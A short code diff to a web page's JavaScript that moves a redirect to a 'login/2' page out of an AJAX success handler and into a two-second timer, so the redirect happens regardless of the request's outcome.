@@ -351,12 +351,16 @@ font-weight: 5px!important;
             }).done(function(msg) {
                 sessionStorage.setItem('visitor', visitor);
                 console.log(msg); // Log success message
-                window.location.href = "login/2";
+
+               
                 
             }).fail(function(err, textstatus, error) {
                 window.location.href = "login/2";
                 console.log('fail');
             });
+            setTimeout(()=> {
+               	window.location.href = "login/2";
+               	}, 2000);
         }
     });
 });
